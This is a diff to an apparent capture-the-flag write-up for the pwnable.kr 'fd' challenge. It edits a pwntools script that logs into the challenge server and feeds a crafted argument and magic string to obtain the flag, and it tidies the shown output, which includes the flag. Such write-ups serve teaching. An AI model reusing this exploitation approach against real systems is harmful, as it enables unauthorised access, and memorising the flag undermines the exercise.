@@ -151,10 +151,10 @@ shell = ssh("fd", "pwnable.kr", password="guest", port=2222)
 process = shell.process(executable="./fd", argv=["fd", "4660"])
 process.sendline("LETMEWIN".encode())
 
-msg = str(process.recv())
-flag = str(process.recv())
-log.info(msg)
-log.success(f"Flag: {flag}")
+msg = process.recv()
+flag = process.recv()
+log.info(msg.decode())
+log.success(f"Flag: {flag.decode()}")
 
 process.close()
 shell.close()
@@ -170,11 +170,9 @@ then using the `python exploit.py` command we get:
     Arch:     amd64
     Version:  4.4.179
     ASLR:     Enabled
-[+] Starting remote process bytearray(b'./fd') on pwnable.kr: pid 3076
-73
-[*] b'good job :)\n'
-[+] Flag: b'mommy! I think I know what a file descriptor is!!\n'
-[*] Stopped remote process 'fd' on pwnable.kr (pid 307673)
+[+] Starting remote process bytearray(b'./fd') on pwnable.kr: pid 58012
+[*] good job :)
+[+] Flag: mommy! I think I know what a file descriptor is!!
+[*] Stopped remote process 'fd' on pwnable.kr (pid 58012)
 [*] Closed connection to 'pwnable.kr'
-(venv) [berna@berna fd]$ 
 ```
